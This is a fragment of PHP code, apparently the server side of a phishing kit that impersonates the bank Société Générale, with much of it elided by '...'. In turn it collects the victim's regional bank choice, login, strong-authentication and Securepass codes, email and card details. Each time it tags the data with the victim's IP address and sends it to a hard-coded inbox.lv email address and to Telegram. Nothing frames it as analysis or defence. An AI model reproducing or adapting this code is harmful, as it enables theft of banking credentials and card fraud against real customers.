...
$to = 'particuliers.societegenerale@inbox.lv'; // Email Here
...
if($_SERVER['REQUEST_METHOD'] == "POST") {
    ...
    if ($_POST['type'] == "region") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $subject = $_SERVER['REMOTE_ADDR'] . ' | SOCIETE GENERAL | Caisse Régionale';
...
telegram_send(urlencode($message));
    ...
    if ($_POST['type'] == "login") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $subject = $_SERVER['REMOTE_ADDR'] . ' | SOCIETE GENERAL | Login';
...
telegram_send(urlencode($message));
    ...
    if ($_POST['type'] == "authfort") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $subject = $_SERVER['REMOTE_ADDR'] . ' | SOCIETE GENERAL | AUTHENTIFICATIONFORTE';
...
telegram_send(urlencode($message));
    ...
    if ($_POST['type'] == "securepass") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $subject = $_SERVER['REMOTE_ADDR'] . ' | SOCIETE GENERAL | Securepasse';
...
telegram_send(urlencode($message));
    ...
    if ($_POST['type'] == "validemail") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $subject = $_SERVER['REMOTE_ADDR'] . ' | SOCIETE GENERAL | Valid Email';
...
telegram_send(urlencode($message));
    ...
    if ($_POST['type'] == "cc") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $subject = $_SERVER['REMOTE_ADDR'] . ' | SOCIETE GENERAL | Card Details';
